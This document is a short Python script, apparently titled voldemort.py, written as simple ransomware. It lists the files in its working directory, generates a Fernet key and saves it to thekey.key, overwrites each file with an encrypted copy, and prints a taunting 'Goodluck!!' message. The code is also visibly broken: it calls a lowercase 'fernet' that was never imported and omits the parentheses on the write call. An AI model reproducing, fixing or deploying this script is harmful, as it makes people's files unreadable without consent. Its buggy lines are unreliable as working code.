#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#let's find the files first

files= []

for file in os.listdir():
        if file=="voldemort.py" or file == "thekey.key" :
                continue
        if os.path.isfile(file):    
                files.append(file) 
        
#print all files discovered         
print(files)  
#generate an encryption key
key = Fernet.generate_key()

with open("thekey.key", "wb" ) as thekey:
                 thekey.write(key) 
#encrypting all discovered files using the loop
for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.writecontents_encrypted
                
print("Your files have been encyrpted, Goodluck!!")                
                
                 
                 
          
